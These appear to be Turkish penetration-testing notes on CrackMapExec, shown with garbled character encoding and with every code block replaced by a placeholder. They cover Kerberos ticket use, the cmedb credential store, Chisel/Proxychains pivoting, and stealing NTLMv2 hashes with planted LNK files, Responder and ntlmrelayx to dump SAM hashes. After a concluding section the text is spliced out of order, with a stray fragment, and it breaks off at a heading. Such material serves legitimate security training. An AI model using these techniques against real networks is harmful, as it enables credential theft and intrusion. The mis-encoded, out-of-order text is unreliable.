Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'print

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

